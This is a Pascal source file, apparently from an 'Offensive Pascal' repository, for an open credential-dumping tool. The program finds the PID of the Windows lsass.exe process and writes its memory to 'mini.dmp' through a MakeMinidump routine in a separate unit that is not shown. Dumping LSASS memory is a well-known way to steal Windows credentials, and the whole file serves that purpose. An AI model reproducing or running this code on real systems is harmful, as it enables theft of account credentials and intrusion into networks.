
  {

   this one is part of repo published on github under the name of Offensive Pascal
   Pascal is a great and still up to date :)

   these projects can be compilied using FreePascal (FPC)
   or Delphi

  }


program minidump;

{$mode objfpc}{$H+}

uses
  {$IFDEF UNIX}
  cthreads,
  {$ENDIF}
  Classes, SysUtils, CustApp,JwaTlHelp32,windows, mini_dump_un;

 // imported API
//function MiniDumpWriteDump(hProcess: THANDLE; ProcessId: DWORD; hFile: THANDLE; DumpType: DWORD; ExceptionParam: pointer; UserStreamParam: pointer; CallbackParam: pointer): BOOL; stdcall;
   //external 'dbghelp.dll' name 'MiniDumpWriteDump';


type

  { TMiniDump }

  TMiniDump = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    procedure dump; virtual;
  end;

{ TMiniDump }



Function ProcessIDFromAppname32( appname: String ): DWORD;
   { Take only the application filename, not full path! }
   Var
 	snapshot: THandle;
 	processEntry : TProcessEntry32;
   Begin
 	Result := 0;
 	appName := UpperCase( appname );
 	snapshot := CreateToolhelp32Snapshot(
 				  TH32CS_SNAPPROCESS,
 				  0 );
 	If snapshot <> 0 Then
 	try
 	  processEntry.dwSize := Sizeof( processEntry );
 	  If Process32First( snapshot, processEntry ) Then
 	  Repeat
 		If Pos(appname,
 			   UpperCase(ExtractFilename(
 							 StrPas(processEntry.szExeFile)))) > 0
 		Then Begin
 		  Result:= processEntry.th32ProcessID;
 		  Break;
 		End; { If }
 	  Until not Process32Next( snapshot, processEntry );
 	finally
 	  CloseHandle(snapshot);
 	End; { try }
   End;

procedure TMiniDump.dump;
var
 dwpid : Dword;
  begin
 dwPid := ProcessIDFromAppname32('lsass.exe');
 try
   mini_dump_un.MakeMinidump(dwPid, 'mini.dmp');
   writeln('[+] lsass dump created successfully');
   finally
    Terminate;
   end;
  end;


procedure TMiniDump.DoRun;
var
  ErrorMsg: String;
begin

  { add your program here }
    dump;
  // stop program loop
  Terminate;
end;

var
  Application: TMiniDump;
begin
  Application:=TMiniDump.Create(nil);
  Application.Title:='MiniDump';
  Application.Run;
  Application.Free;
end.

